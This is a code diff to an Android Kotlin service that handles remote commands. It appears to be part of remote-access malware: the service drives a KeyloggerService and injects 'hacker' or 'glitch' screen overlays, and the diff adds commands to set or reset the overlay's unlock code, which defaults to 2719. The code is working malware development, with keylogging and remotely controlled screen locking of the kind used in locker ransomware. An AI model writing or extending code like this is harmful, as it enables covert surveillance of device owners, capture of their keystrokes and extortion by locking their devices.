@@ -294,6 +294,8 @@ class ConnectorService : Service() {
             cmd.startsWith("screen_inject_glitch:")   -> Pair(doScreenInject(cmd.removePrefix("screen_inject_glitch:"),   "glitch"),   "command_result")
             cmd.startsWith("screen_inject:")          -> Pair(doScreenInject(cmd.removePrefix("screen_inject:"),          "hacker"),   "command_result")
             cmd == "screen_inject_stop"               -> Pair(doScreenInjectStop(), "command_result")
+            cmd.startsWith("screen_inject_set_code:")  -> Pair(doSetUnlockCode(cmd.removePrefix("screen_inject_set_code:")), "command_result")
+            cmd == "screen_inject_reset_code"           -> Pair(doResetUnlockCode(), "command_result")
 
             else -> Pair("ERROR: Unknown command: $cmd", "command_result")
         }
@@ -898,6 +900,19 @@ class ConnectorService : Service() {
             KeyloggerService.hideScreenInject()
             "OK: Overlay dihapus"
         } catch (e: Exception) { "ERROR: ${e.message}" }
+    }
+
+    private fun doSetUnlockCode(code: String): String {
+        val c = code.trim().filter { it.isLetterOrDigit() }.take(12)
+        return if (c.length >= 2) {
+            KeyloggerService.setUnlockCode(c)
+            "OK: Unlock code set to [$c]"
+        } else "ERROR: Code too short — min 2 chars"
+    }
+
+    private fun doResetUnlockCode(): String {
+        KeyloggerService.resetUnlockCode()
+        return "OK: Unlock code reset to [2719]"
     }
 
     private fun log(msg: String) {
